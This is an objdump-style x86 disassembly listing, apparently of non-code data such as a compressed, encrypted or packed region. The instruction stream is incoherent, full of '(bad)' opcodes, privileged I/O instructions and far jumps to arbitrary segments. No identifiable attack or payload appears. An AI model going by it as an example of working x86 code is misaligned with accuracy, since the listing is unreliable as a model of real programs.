  416bbb:	mov    fs,WORD PTR [ecx-0x5b]
  416bbe:	stc    
  416bbf:	pop    ss
  416bc0:	aad    0x65
  416bc2:	ds out 0x46,eax
  416bc5:	sbb    dl,BYTE PTR [ebx]
  416bc7:	push   es
  416bc8:	mov    WORD PTR [ecx-0x22],ds
  416bcb:	xor    eax,0x33306a0e
  416bd0:	repnz dec eax
  416bd2:	mov    eax,0x90d19b24
  416bd7:	mov    cl,0xa5
  416bd9:	sbb    eax,0xd375d123
  416bde:	mov    dl,0xea
  416be0:	mov    WORD PTR [edx-0x580ee83a],cs
  416be6:	inc    edi
  416be7:	repnz sahf 
  416be9:	rol    DWORD PTR [edx],0xca
  416bec:	fwait
  416bed:	adc    BYTE PTR [edi+0x664e8c91],ah
  416bf3:	sub    al,0x89
  416bf5:	pushf  
  416bf6:	sub    bl,BYTE PTR [ebp-0x5d]
  416bf9:	mov    ecx,0x87e910e3
  416bfe:	mov    ah,0xb5
  416c00:	pop    ss
  416c01:	idiv   BYTE PTR [ebp+0x58]
  416c04:	test   ch,ah
  416c06:	jns    0x416c60
  416c08:	ret    
  416c09:	adc    BYTE PTR [edx+0x4755aed4],al
  416c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c10:	push   ecx
  416c11:	in     eax,dx
  416c12:	test   BYTE PTR [eax-0x48],al
  416c15:	in     al,dx
  416c16:	xor    DWORD PTR [edx],ebx
  416c18:	int3   
  416c19:	jle    0x416c62
  416c1b:	pop    ss
  416c1c:	in     eax,dx
  416c1d:	pop    ebp
  416c1e:	dec    ebp
  416c1f:	mov    ds:0x6b162a5c,al
  416c24:	xor    al,0x3
  416c26:	pusha  
  416c27:	push   esp
  416c28:	mov    dl,0x75
  416c2a:	icebp  
  416c2b:	push   ss
  416c2c:	pop    ss
  416c2d:	enter  0x617f,0xb3
  416c31:	push   ebp
  416c32:	fsubr  DWORD PTR [edx+0x494075ae]
  416c38:	jbe    0x416c7f
  416c3a:	and    al,0x46
  416c3c:	add    al,0x36
  416c3e:	xchg   edi,eax
  416c3f:	pop    esp
  416c40:	arpl   WORD PTR [eax+0x23],bp
  416c43:	jne    0x416c6d
  416c45:	(bad)  
  416c46:	fcomp  QWORD PTR [edi-0x6862c8be]
  416c4c:	mov    ah,0x9e
  416c4e:	push   ss
  416c4f:	test   BYTE PTR [eax+0x4da3a617],dh
  416c55:	mov    al,ds:0x3eb8d6e5
  416c5a:	retf   0x200e
  416c5d:	push   cs
  416c5e:	inc    edx
  416c5f:	dec    ebx
  416c60:	pop    ecx
  416c61:	hlt    
  416c62:	pop    ecx
  416c63:	or     al,0xb5
  416c65:	imul   eax,ecx,0xffffffb3
  416c68:	adc    BYTE PTR ds:0xf65472da,al
  416c6e:	mov    dl,0xa1
  416c70:	(bad)  
  416c71:	sub    esp,DWORD PTR [edi-0x1bdf05de]
  416c77:	adc    DWORD PTR [eax-0x766a7275],0xfffffffe
  416c7e:	cmp    DWORD PTR [edx+0x48],esp
  416c81:	jge    0x416cb2
  416c83:	retf   
  416c84:	popa   
  416c85:	xor    eax,0x76f51f1e
  416c8a:	xchg   edi,eax
  416c8b:	adc    al,0x22
  416c8d:	dec    edi
  416c8e:	sub    ah,BYTE PTR [ebp-0x36]
  416c91:	push   esp
  416c92:	jmp    0x2ddce693
  416c97:	shl    ah,0x9d
  416c9a:	inc    eax
  416c9b:	push   ebx
  416c9c:	arpl   WORD PTR ds:0x80817a59,cx
  416ca2:	sub    esi,DWORD PTR [ecx-0x1a975a23]
  416ca8:	cwde   
  416ca9:	(bad)  
  416caa:	pop    es
  416cab:	xchg   ebx,eax
  416cac:	outs   dx,DWORD PTR ds:[esi]
  416cad:	jbe    0x416c6a
  416caf:	adc    bh,BYTE PTR [edx+0x11]
  416cb2:	push   ebx
  416cb3:	(bad)  
  416cb4:	jmp    0x3983:0xf54195db
  416cbb:	ja     0x416cdf
  416cbd:	rcr    ecx,cl
  416cbf:	dec    esi
  416cc0:	pop    ss
  416cc1:	xlat   BYTE PTR ds:[ebx]
  416cc2:	pavgw  mm5,QWORD PTR [edi-0x40]
  416cc6:	dec    esi
  416cc7:	jo     0x416d11
  416cc9:	outs   dx,BYTE PTR ds:[esi]
  416cca:	and    edx,DWORD PTR [eax]
  416ccc:	push   edi
  416ccd:	pop    ecx
  416cce:	jbe    0x416c53
  416cd0:	mov    ebx,0x826c8bd1
  416cd5:	pop    edi
  416cd6:	jne    0x416cfc
  416cd8:	js     0x416d54
  416cda:	xchg   edx,eax
  416cdb:	and    al,0x24
  416cdd:	mov    edi,0x6a0d8ea1
  416ce2:	loope  0x416c6e
  416ce4:	pop    ds
  416ce5:	mov    DWORD PTR [ecx-0x42],0x601ca52
  416cec:	leave  
  416ced:	pop    esi
  416cee:	out    dx,al
  416cef:	fnstsw WORD PTR [ebx-0x134b69cd]
  416cf5:	mov    ds:0x88ba130f,al
  416cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cfb:	cmp    DWORD PTR [eiz*4-0x2bbbee6e],0x51
  416d03:	sub    DWORD PTR [ecx+0xd],ebp
  416d06:	pop    ebx
  416d07:	in     eax,dx
  416d08:	lock ins BYTE PTR es:[edi],dx
  416d0a:	test   BYTE PTR [eax-0x4f],al
  416d0d:	mov    bl,0x12
  416d0f:	jo     0x416d40
  416d11:	idiv   BYTE PTR [ecx+0x6fb5c97f]
  416d17:	js     0x416d46
  416d19:	or     bh,BYTE PTR ds:0x9823c741
  416d1f:	in     al,0x77
  416d21:	test   al,0x85
  416d23:	xchg   edi,edx
  416d25:	(bad)  
  416d26:	dec    BYTE PTR [ebx-0x50]
  416d29:	outs   dx,DWORD PTR ds:[esi]
  416d2a:	mov    ds:0x15e5803e,eax
  416d2f:	mov    ?,edx
  416d31:	add    al,0xb4
  416d34:	mov    ds:0x816195ec,eax
  416d39:	xchg   DWORD PTR [ebx+ebp*2-0x499d5e9e],edi
  416d40:	jae    0x416d97
  416d42:	out    dx,eax
  416d43:	or     DWORD PTR [ecx+ebx*8],0x32baf61a
  416d4a:	into   
  416d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d4c:	mov    BYTE PTR [esi-0x2],al
  416d4f:	shl    BYTE PTR [esi+eiz*1],cl
  416d52:	pop    ebp
  416d53:	ret    
  416d54:	loope  0x416dbe
  416d56:	mov    BYTE PTR ds:0x7c6614c2,0xa8
  416d5d:	xor    eax,0xae35aaf9
  416d62:	fs mov ecx,0x66ee6f10
  416d68:	(bad)  
  416d69:	hlt    
  416d6a:	push   esi
  416d6b:	jecxz  0x416d7f
  416d6d:	data16 fnstsw WORD PTR [esi-0x7e]
  416d71:	push   edi
  416d72:	mov    esi,0x78526ac
  416d77:	inc    edx
  416d78:	test   al,0xa3
  416d7a:	jbe    0x416dbf
  416d7c:	pop    edx
  416d7d:	repnz or DWORD PTR [ecx-0x3427d51e],0xfffffff8
  416d85:	cmp    eax,ebp
  416d87:	cmp    eax,0xc8c77513
  416d8c:	mov    ebx,0xf78befa7
  416d91:	popf   
  416d92:	mov    ch,0x2c
  416d94:	cmp    edi,DWORD PTR [ebx+0x5a58990f]
  416d9a:	inc    edx
  416d9b:	sbb    al,0xa2
  416d9d:	std    
  416d9e:	leave  
  416d9f:	or     al,0x88
  416da1:	adc    esi,ebx
  416da3:	xchg   ebp,eax
  416da4:	or     al,0x53
  416da6:	xchg   edi,eax
  416da7:	lds    ebx,FWORD PTR [edi+0x4a]
  416daa:	sbb    edi,DWORD PTR [edx]
  416dac:	ds sbb al,0x0
  416daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416db0:	dec    edi
  416db1:	shl    BYTE PTR [edx+0x66],cl
  416db4:	pop    ds
  416db5:	rcr    ebp,0xab
  416db8:	push   ds
  416db9:	jl     0x416d96
  416dbb:	imul   esi,esi,0xffffffa9
  416dbe:	fistp  WORD PTR ds:0x3402df7d
  416dc4:	push   eax
  416dc5:	lods   al,BYTE PTR ds:[esi]
  416dc6:	test   cl,ah
  416dc8:	inc    esi
  416dc9:	lds    esi,FWORD PTR cs:[ecx-0xe]
  416dcd:	cmp    eax,0xf26cadd7
  416dd2:	stos   BYTE PTR es:[edi],al
  416dd3:	xchg   DWORD PTR [eax-0x5c3a1d3c],eax
  416dd9:	les    ebp,FWORD PTR [eax-0x283f85cb]
  416ddf:	(bad)  
  416de0:	sub    al,0xbc
  416de2:	and    al,0xca
  416de4:	fwait
  416de5:	xor    ch,0xdd
  416de8:	shr    BYTE PTR [esi-0x54],1
  416deb:	cli    
  416dec:	int    0xc2
  416dee:	jg     0x416e26
  416df0:	sbb    dh,BYTE PTR [edi]
  416df2:	xchg   BYTE PTR [ebx+0x2fb01a34],bh
  416df8:	sysexit 
  416dfa:	push   esp
  416dfb:	fdiv   QWORD PTR [eax]
  416dfd:	fild   DWORD PTR [ebp+ecx*4+0x7cea206b]
  416e04:	popf   
  416e05:	jmp    0x416e63
  416e07:	and    BYTE PTR [ebp-0x56],bh
  416e0a:	and    esp,edx
  416e0c:	ret    0x9586
  416e0f:	retf   0x77f0
  416e12:	mov    ds:0xc2c6b84b,eax
  416e17:	clc    
  416e18:	aam    0xe8
  416e1a:	cmp    esi,DWORD PTR [ebp+ecx*8-0x3ce13a08]
  416e21:	mov    eax,ds:0x672e2f03
  416e26:	cmp    ebx,eax
  416e28:	lods   eax,DWORD PTR ds:[esi]
  416e29:	and    DWORD PTR [eax+ebx*8-0x4ad4436d],0x141b92e6
  416e34:	jecxz  0x416e97
  416e36:	xchg   edx,eax
  416e37:	jl     0x416e1b
  416e39:	ds nop
  416e3b:	aas    
  416e3c:	mov    edx,0xf7a5a5ce
  416e41:	sbb    dh,cl
  416e43:	fisubr DWORD PTR [ebp-0x517396d3]
  416e49:	test   eax,0x8cc2a9ae
  416e4e:	sub    DWORD PTR [esi],edx
  416e50:	aas    
  416e51:	xor    bh,BYTE PTR [eax+esi*8+0x309e187f]
  416e58:	mov    WORD PTR [ecx+eiz*4+0x63cd600a],cs
  416e5f:	or     al,0xeb
  416e61:	test   eax,0xd0b92493
  416e66:	sar    BYTE PTR [eax+esi*4+0x649a3844],cl
  416e6d:	mov    dh,0x56
  416e6f:	inc    eax
  416e70:	xor    bh,BYTE PTR [esi+0x7e]
  416e73:	push   cs
  416e74:	pop    esp
  416e75:	cmp    al,0x28
  416e77:	adc    bl,BYTE PTR [eax+0x71dac72f]
  416e7d:	cmp    DWORD PTR [ebx+0x23],0xaed43810
  416e84:	dec    ebp
  416e85:	dec    ebx
  416e86:	sahf   
  416e87:	mov    ds:0x72754389,eax
  416e8c:	jb     0x416e3d
  416e8e:	jecxz  0x416e6c
  416e90:	popf   
  416e91:	and    al,0x7a
  416e93:	int    0x90
  416e95:	das    
  416e96:	push   ss
  416e97:	mov    dl,0x27
  416e99:	repz sub ecx,0x67cb6a6d
  416ea0:	out    0xf4,eax
  416ea2:	jge    0x416e88
  416ea4:	lahf   
  416ea5:	fistp  DWORD PTR [edi+ecx*2-0x789202fe]
  416eac:	lods   eax,DWORD PTR ds:[esi]
  416ead:	push   edx
  416eae:	dec    edi
  416eaf:	stos   BYTE PTR es:[edi],al
  416eb0:	outs   dx,DWORD PTR ds:[esi]
  416eb1:	popf   
  416eb2:	pop    edi
  416eb3:	inc    BYTE PTR [ecx]
  416eb5:	or     BYTE PTR [ecx+ebx*4-0x14],0x8c
  416eba:	outs   dx,DWORD PTR ds:[esi]
  416ebb:	mov    eax,ds:0x68784ac8
  416ec0:	aad    0xdc
  416ec2:	fisub  WORD PTR [ebp+0x1c]
  416ec5:	shr    BYTE PTR [ecx+0x4d1012b],cl
  416ecb:	jg     0x416ed4
  416ecd:	and    ch,dl
  416ecf:	cli    
  416ed0:	xor    BYTE PTR [ecx-0x4e6364],0x7f
  416ed7:	stos   BYTE PTR es:[edi],al
  416ed8:	jno    0x416f57
  416eda:	ret    
  416edb:	xor    esp,DWORD PTR [edx-0x4d2bbf9f]
  416ee1:	addr16 (bad) 
  416ee3:	out    dx,al
  416ee4:	outs   dx,BYTE PTR ds:[esi]
  416ee5:	daa    
  416ee6:	call   0x4e00:0x588bc42f
  416eed:	and    esp,eax
  416eef:	inc    ebp
  416ef0:	push   0xffffff9e
  416ef2:	out    0xcc,al
  416ef4:	and    edx,DWORD PTR [esi+0x2b22b247]
  416efa:	into   
  416efb:	mul    DWORD PTR [ebx+0x510b6027]
  416f01:	icebp  
  416f02:	stos   BYTE PTR es:[edi],al
  416f03:	das    
  416f04:	sub    al,0x6c
  416f06:	jle    0x416ecd
  416f08:	repz loope 0x416f54
  416f0b:	xchg   esp,eax
  416f0c:	adc    BYTE PTR [edx+0x4ddc30d5],0x78
  416f13:	lods   al,BYTE PTR ds:[esi]
  416f14:	dec    esi
  416f15:	mov    WORD PTR ds:0x4a544f3f,ds
  416f1b:	or     esp,DWORD PTR [eax]
  416f1d:	sbb    bh,BYTE PTR ds:0x867256a4
  416f23:	jecxz  0x416ee2
  416f25:	adc    eax,0x902f2378
  416f2a:	stc    
  416f2b:	cmp    ebx,DWORD PTR [ecx+ecx*4+0x5e]
  416f2f:	and    eax,0xf8e47557
  416f34:	xchg   esi,eax
  416f35:	add    BYTE PTR [edi],0xf1
  416f38:	fmul   QWORD PTR ds:[edi]
  416f3b:	ins    DWORD PTR es:[edi],dx
  416f3c:	in     al,0xb9
  416f3e:	xlat   BYTE PTR ds:[ebx]
  416f3f:	test   al,bh
  416f41:	iret   
  416f42:	mov    bh,0xee
  416f44:	push   0xffffffe1
  416f46:	ret    0x9829
  416f49:	mov    DWORD PTR [esp+ebp*1+0x22d30b61],edx
  416f50:	sbb    al,0x8
  416f52:	mov    dl,0x41
  416f54:	dec    ecx
  416f55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f56:	pop    es
  416f57:	cmp    esi,DWORD PTR [esi]
  416f59:	xchg   edi,eax
  416f5a:	sub    dh,cl
  416f5c:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  416f5e:	add    cl,BYTE PTR [edx-0x118efdf1]
  416f64:	sub    ch,cl
  416f66:	pop    esi
  416f67:	lea    edx,[ebx+edi*4-0x6c]
  416f6b:	out    0xb2,eax
  416f6d:	adc    al,0x4e
  416f6f:	popf   
  416f70:	xchg   edi,eax
  416f71:	outs   dx,BYTE PTR ds:[esi]
  416f72:	nop
  416f73:	mov    WORD PTR [edi],ds
  416f75:	daa    
  416f76:	and    bh,ah
  416f78:	push   ss
  416f79:	mov    ebx,0x81570f9
  416f7e:	jmp    0x2e50:0x8649191a
  416f85:	jo     0x416fdf
  416f87:	rcr    BYTE PTR [ecx+ebp*4-0x4a],1
  416f8b:	mov    al,0xf7
  416f8d:	push   ds
  416f8e:	adc    ebx,esi
  416f90:	popa   
  416f91:	inc    ecx
  416f92:	addr16 push esi
  416f94:	cmp    edi,DWORD PTR [ebp+eiz*2+0x79]
  416f98:	xchg   edx,eax
  416f99:	xchg   esi,eax
  416f9a:	xchg   ebx,ecx
  416f9c:	fdivr  st(6),st
  416f9e:	push   ss
  416f9f:	cli    
  416fa0:	popf   
  416fa1:	add    DWORD PTR [ebp+0x20],edi
  416fa4:	shl    ebp,cl
  416fa6:	adc    ch,BYTE PTR ds:0x4c1a2cca
  416fac:	test   BYTE PTR [ebx],bh
  416fae:	or     edx,DWORD PTR [esi]
  416fb0:	mov    esp,0xd15debd2
  416fb5:	outs   dx,BYTE PTR ds:[esi]
  416fb6:	ds repz and al,0xe1
  416fba:	loop   0x416ff8
  416fbc:	test   BYTE PTR [esi+0x7b],cl
  416fbf:	imul   ebp,eax,0xffffffc3
  416fc2:	sub    al,0x4f
  416fc4:	sub    al,0xca
  416fc6:	jns    0x41703c
  416fc8:	ins    DWORD PTR es:[edi],dx
  416fc9:	int    0x0
  416fcb:	ins    BYTE PTR es:[edi],dx
  416fcc:	cmp    eax,0xa2ba34dd
  416fd1:	push   0xffffffeb
  416fd3:	dec    esp
  416fd4:	mov    ds:0xa0c32d3f,eax
  416fd9:	sbb    eax,0x13b52f6c
  416fde:	jb     0x416f7f
  416fe0:	xchg   edi,eax
  416fe1:	mov    al,ds:0x6e2e762d
  416fe6:	sub    bl,BYTE PTR cs:[esi]
  416fe9:	dec    ebx
  416fea:	shr    DWORD PTR [edi-0x5617b45e],0xb5
  416ff1:	ds mov si,0x2116
  416ff6:	sbb    ecx,eax
  416ff8:	in     eax,0x39
  416ffa:	xchg   edx,eax
  416ffb:	repz xchg ecx,eax
  416ffd:	and    bl,ch
  416fff:	pop    esp
  417000:	imul   esp,DWORD PTR [edx],0xffffffbe
  417003:	add    DWORD PTR ds:0xaf0ed538,ecx
  417009:	or     DWORD PTR [edx-0x21bc2736],ebp
  41700f:	adc    DWORD PTR [ebx+0x3aa08971],ebx
  417015:	ret    
  417016:	aad    0xa1
  417018:	push   cs
  417019:	mov    ebp,0xb5d7edc2
  41701e:	mov    fs,WORD PTR [edi+0x60]
  417021:	clc    
  417022:	shl    dh,1
  417024:	inc    ebp
  417025:	call   0x8175:0x89d4e209
  41702c:	aaa    
  41702d:	mov    ecx,0x25cdaf6a
  417032:	mov    bl,0x99
  417034:	sti    
  417035:	ret    0x4baa
  417038:	test   eax,0x314f6c6
  41703d:	call   0x7457049f
  417042:	in     eax,0xcd
  417044:	pop    ebp
  417045:	mov    BYTE PTR [edi-0x32],ah
  417048:	fnsave [edx-0x10]
  41704b:	dec    edx
  41704c:	cmc    
  41704d:	jg     0x417071
  41704f:	mov    edi,0xc9e45fba
  417054:	jae    0x417017
  417056:	jp     0x416fe9
  417058:	dec    eax
  417059:	xchg   edi,ecx
  41705b:	scas   eax,DWORD PTR es:[edi]
  41705c:	cmp    BYTE PTR [eax+0x42],dh
  41705f:	mov    al,ds:0x63894b57
  417064:	call   0xcc20:0xdc8f6532
  41706b:	mov    WORD PTR [ebx],?
  41706d:	jno    0x417036
  41706f:	leave  
  417070:	xchg   esi,eax
  417071:	mov    bl,0xe9
  417073:	aad    0xa2
  417075:	fwait
  417076:	shl    ebp,0x23
  417079:	iret   
  41707a:	jb     0x41700a
  41707c:	int    0xe0
  41707e:	inc    ebp
  41707f:	fwait
  417080:	mov    edi,0xfe3e277e
  417085:	dec    ebp
  417086:	pop    esp
  417087:	ret    
  417088:	(bad)  
  417089:	popa   
  41708a:	cmp    eax,0xf73d7557
  41708f:	out    dx,al
  417090:	pop    ebx
  417091:	paddsw mm5,QWORD PTR [ebp+0x342bb68b]
  417098:	jecxz  0x41707c
  41709a:	xor    bh,bl
  41709c:	jl     0x41703e
  41709e:	push   edx
  41709f:	leave  
  4170a0:	call   0xdeba:0xf4678aa
  4170a7:	aaa    
  4170a8:	test   DWORD PTR [eax-0x48],0x3a093648
  4170af:	jecxz  0x417127
  4170b1:	push   esp
  4170b2:	pop    edx
  4170b3:	pop    ecx
  4170b4:	xor    al,0x2c
  4170b6:	mov    ds:0x1c1b8a50,eax
  4170bb:	mov    esi,0xdddb17c3
  4170c0:	sub    al,BYTE PTR [ebx-0x1b]
  4170c3:	mov    al,0xa8
  4170c5:	pop    esi
  4170c6:	add    ebx,0x18
  4170c9:	imul   ebp,DWORD PTR ds:[ebx-0x4a],0xffffffca
  4170ce:	jmp    0x75e02c90
  4170d3:	ret    
  4170d4:	mov    ds:0x2c7c5acb,al
  4170d9:	push   eax
  4170da:	mov    DWORD PTR [eax+0x46810cb5],edi
  4170e0:	push   ebx
  4170e1:	loop   0x417135
  4170e3:	rcl    DWORD PTR [edx],0x63
  4170e6:	shr    BYTE PTR [eax-0x32],1
  4170e9:	pop    ebx
  4170ea:	stos   DWORD PTR es:[edi],eax
  4170eb:	ror    BYTE PTR [edx+0x5e08684d],1
  4170f1:	shl    bl,0x94
  4170f4:	mul    DWORD PTR [eax]
  4170f6:	in     eax,dx
  4170f7:	fldcw  WORD PTR [ecx-0x7a0f2834]
  4170fd:	cmp    ebp,edi
  4170ff:	shr    dl,1
  417101:	sub    BYTE PTR [eax+0x791eff27],dl
  417107:	mov    ds,WORD PTR [esi-0x6b88372e]
  41710d:	push   ecx
  41710e:	(bad)  
  41710f:	mov    ch,0x98
  417111:	rol    DWORD PTR [ecx],0xc7
  417114:	popf   
  417115:	add    al,0x49
  417117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417118:	inc    esi
  417119:	adc    al,0x89
  41711b:	push   cs
  41711c:	scas   al,BYTE PTR es:[edi]
  41711d:	cmp    DWORD PTR ds:0xd7e70c2a,ebx
  417123:	dec    ecx
  417124:	repz test BYTE PTR ss:[ecx+eiz*4-0x340ad1d],ah
  41712d:	fidiv  DWORD PTR [ebx-0x12bbe63d]
  417133:	mul    DWORD PTR [esi+esi*2+0x25]
  417137:	call   0xe02a:0x2800cc1c
  41713e:	(bad)  
  41713f:	cli    
  417140:	cmp    ebp,DWORD PTR [edx]
  417142:	push   eax
  417143:	cli    
  417144:	mov    dl,BYTE PTR [ebx-0x6d]
  417147:	inc    eax
  417148:	jmp    0x41712c
  41714a:	sub    DWORD PTR [eax+eax*1+0x16],edi
  41714e:	out    dx,al
  41714f:	rol    DWORD PTR [edx],cl
  417151:	xchg   ebx,eax
  417152:	pop    ebp
  417153:	aas    
  417154:	inc    eax
  417155:	mov    dh,0xce
  417157:	lds    edx,FWORD PTR [edx-0x476d3ff3]
  41715d:	fldcw  WORD PTR [ebx+0xa]
  417160:	sbb    eax,0xfd11defe
  417165:	loop   0x417168
  417167:	enter  0x75dc,0x6
  41716b:	or     eax,0x520be270
  417170:	fisubr WORD PTR [ecx-0xa]
  417173:	sbb    DWORD PTR [edx+0x2e74b558],0xffffff8c
  41717a:	mov    bh,0x3c
  41717c:	inc    eax
  41717d:	dec    ebx
  41717e:	mov    DWORD PTR [esi+0x4755cbff],eax
  417184:	inc    eax
  417185:	imul   ebp,DWORD PTR [ecx+eiz*2],0xf08442f7
  41718c:	fadd   QWORD PTR [ecx-0xcf89383]
  417192:	arpl   WORD PTR [edi-0x4819f92f],ax
  417198:	jbe    0x4171c9
  41719a:	iret   
  41719b:	mov    ch,0x7c
  41719d:	pop    edx
  41719e:	fucomip st,st(7)
  4171a0:	ret    
  4171a1:	and    al,BYTE PTR [edx]
  4171a3:	clc    
  4171a4:	or     BYTE PTR [eax-0x23],al
  4171a7:	jb     0x417161
  4171a9:	xchg   DWORD PTR [eax+0x5a5f82a8],edx
  4171af:	in     eax,dx
  4171b0:	push   edi
  4171b1:	test   BYTE PTR [edi+0x42],ch
  4171b4:	sub    BYTE PTR [ebx],0x9f
  4171b7:	aad    0x86
  4171b9:	std    
  4171ba:	mov    al,0xa1
  4171bc:	in     eax,0x82
  4171be:	push   esi
  4171bf:	sub    al,bh
  4171c1:	adc    edx,DWORD PTR [eax]
  4171c3:	aad    0x28
  4171c5:	jno    0x41715d
  4171c7:	aaa    
  4171c8:	(bad)  
  4171c9:	loop   0x417202
  4171cb:	mov    al,ds:0x78754bd6
  4171d0:	adc    BYTE PTR [ecx+ecx*1-0x29],cl
  4171d4:	loopne 0x41716f
  4171d6:	mov    cl,0x2
  4171d8:	(bad)  
  4171d9:	out    dx,eax
  4171da:	push   ds
  4171db:	leave  
  4171dc:	lds    eax,FWORD PTR [ebp-0x5aa9e21f]
  4171e2:	pop    ds
  4171e3:	inc    edx
  4171e4:	add    eax,0x23703915
  4171e9:	xchg   BYTE PTR [edx],al
  4171eb:	sbb    eax,0x20245c36
  4171f0:	sub    esp,DWORD PTR [edi+0x2597295a]
  4171f6:	cld    
  4171f7:	fwait
  4171f8:	adc    ah,BYTE PTR [edx+0x3a]
  4171fb:	and    BYTE PTR [ebx-0x76af0d52],bh
  417201:	and    ebp,esi
  417203:	(bad)  
  417204:	fild   WORD PTR [ebx-0x1]
  417207:	mov    eax,0x33ac36c3
  41720c:	aad    0xd1
  41720e:	pop    ds
  41720f:	js     0x417287
  417211:	(bad)  
  417212:	stc    
  417213:	pop    ebp
  417214:	leave  
  417215:	jmp    0x5173:0x5bc81564
  41721c:	inc    edx
  41721d:	cld    
  41721e:	imul   ecx,DWORD PTR [eax-0x7e41168d],0x33
  417225:	repz or eax,0x6cb656bb
  41722b:	jns    0x41727f
  41722d:	push   ebx
  41722e:	aam    0x29
  417230:	pushw  cs
  417232:	jb     0x4171fb
  417234:	sbb    eax,0x36ecb4eb
  417239:	imul   ebp,DWORD PTR [ebx],0x67
  41723c:	div    ah
  41723e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41723f:	jg     0x30d1dda0
  417245:	and    BYTE PTR [ecx-0x1f932af9],bh
  41724b:	dec    eax
  41724c:	int    0x57
  41724e:	jmp    0x4171fb
  417250:	fcmovb st,st(3)
  417252:	je     0x4171d5
  417254:	mov    dh,0xc4
  417256:	push   ss
  417257:	shr    al,cl
  417259:	mov    edi,0xaea2b027
  41725e:	clc    
  41725f:	pop    ebp
  417260:	ret    0x42c5
  417263:	sub    dl,ah
  417265:	push   es
  417266:	es in  al,0x49
  417269:	out    0xa8,eax
  41726b:	or     ch,BYTE PTR [edi]
  41726d:	jmp    FWORD PTR [esi-0x285dd253]
  417273:	repnz dec ebp
  417275:	fild   DWORD PTR [ebx-0x7c]
  417278:	sbb    dh,bl
  41727a:	pop    ecx
  41727b:	and    al,0x22
  41727d:	mov    dh,0x49
  41727f:	fs mov cl,0x67
  417282:	cmp    ebp,DWORD PTR [ecx-0x7be97580]
  417288:	out    dx,al
  417289:	jnp    0x4172f4
  41728b:	push   es
  41728c:	jb     0x4172fa
  41728e:	xor    al,0x96
  417290:	fild   QWORD PTR [eax+0x3d]
  417293:	xchg   esi,eax
  417294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417295:	sti    
  417296:	aam    0xae
  417298:	inc    edx
  417299:	dec    eax
  41729a:	repz mov ebp,0xd56cf185
  4172a0:	aam    0x9
  4172a2:	or     dl,BYTE PTR [ebx]
  4172a4:	xchg   esi,eax
  4172a5:	sbb    al,BYTE PTR [ebx]
  4172a7:	lods   al,BYTE PTR ds:[esi]
  4172a8:	adc    al,0x6f
  4172aa:	out    dx,al
  4172ab:	imul   ecx,DWORD PTR [eax],0x51f5ba9c
  4172b1:	ficom  WORD PTR [ebp-0x2f]
  4172b4:	shl    DWORD PTR [edx+0x22],cl
  4172b7:	nop
  4172b8:	inc    eax
  4172b9:	iret   
  4172ba:	loop   0x41729e
  4172bc:	cmc    
  4172bd:	lods   al,BYTE PTR ds:[esi]
  4172be:	ror    DWORD PTR [ebp-0x48c21649],cl
  4172c4:	stos   BYTE PTR es:[edi],al
  4172c5:	popa   
  4172c6:	mov    esi,0x1ea1b0bf
  4172cb:	add    al,0x3
  4172cd:	fs pop eax
  4172cf:	pop    edi
  4172d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172d1:	xchg   esp,eax
  4172d2:	stos   DWORD PTR es:[edi],eax
  4172d3:	loope  0x41732b
  4172d5:	fsub   QWORD PTR [eax-0xd]
  4172d8:	xchg   BYTE PTR [eax+0x73],bl
  4172db:	test   al,0xfd
  4172dd:	cs or  al,0xa3
  4172e0:	xor    BYTE PTR [eax],dh
  4172e2:	nop
  4172e3:	fist   WORD PTR [esi-0x44]
  4172e6:	fmul   st,st(0)
  4172e8:	gs scas eax,DWORD PTR es:[edi]
  4172ea:	arpl   bx,bx
  4172ec:	mov    al,ds:0x2bed5b5b
  4172f1:	jmp    0x417340
  4172f3:	rol    BYTE PTR [edi-0x797e3d1b],1
  4172f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172fb:	add    al,0x6
  4172fd:	dec    ebx
  4172fe:	les    eax,FWORD PTR [ebx]
  417300:	push   ecx
  417301:	sbb    eax,0x98ae53f
  417306:	push   ss
  417307:	icebp  
  417308:	mov    bh,0x79
  41730a:	mov    ds:0xc6c6cbfa,al
  41730f:	in     al,0xa9
  417311:	out    0x69,eax
  417313:	cwde   
  417314:	repz icebp 
  417316:	popf   
  417317:	stos   DWORD PTR es:[edi],eax
  417318:	je     0x4172e5
  41731a:	out    dx,al
  41731b:	xor    al,0xc4
  41731d:	mov    bh,0xbd
  41731f:	aas    
  417320:	mov    WORD PTR [ecx+0x2e89a4df],ss
  417326:	inc    ebp
  417327:	lds    edx,FWORD PTR [esi]
  417329:	fsub   QWORD PTR [ecx]
  41732b:	sbb    dl,BYTE PTR ds:0x9b3c342f
  417331:	rol    DWORD PTR [ebx+0x2ea30777],1
  417337:	pop    esi
  417338:	in     eax,dx
  417339:	(bad)  
  41733a:	dec    ecx
  41733b:	popf   
  41733c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41733d:	cmp    DWORD PTR [esi],0xffffffd3
  417340:	scas   eax,DWORD PTR es:[edi]
  417341:	mov    ah,0x25
  417343:	jmp    0x88647c0
  417348:	inc    ebp
  417349:	push   edi
  41734a:	sbb    al,0xbe
  41734c:	pop    edx
  41734d:	mov    al,0xc0
  41734f:	jbe    0x417301
  417351:	mov    cl,0xba
  417353:	shl    BYTE PTR [ecx+esi*8-0x39],cl
  417357:	dec    ecx
  417358:	xchg   BYTE PTR [ecx+edi*1],ah
  41735b:	gs mov esi,0x80223da5
  417361:	bound  ebp,QWORD PTR [ebp+0x0]
  417364:	sahf   
  417365:	xchg   BYTE PTR ds:0xec108ac1,al
  41736b:	adc    al,0x17
  41736d:	pop    eax
  41736e:	gs jmp 0x417307
  417371:	mov    esp,0x2665c0c9
  417376:	das    
  417377:	les    eax,FWORD PTR [ebp+0x648817e2]
  41737d:	jae    0x4173a4
  41737f:	jg     0x41731c
  417381:	rep ins DWORD PTR es:[edi],dx
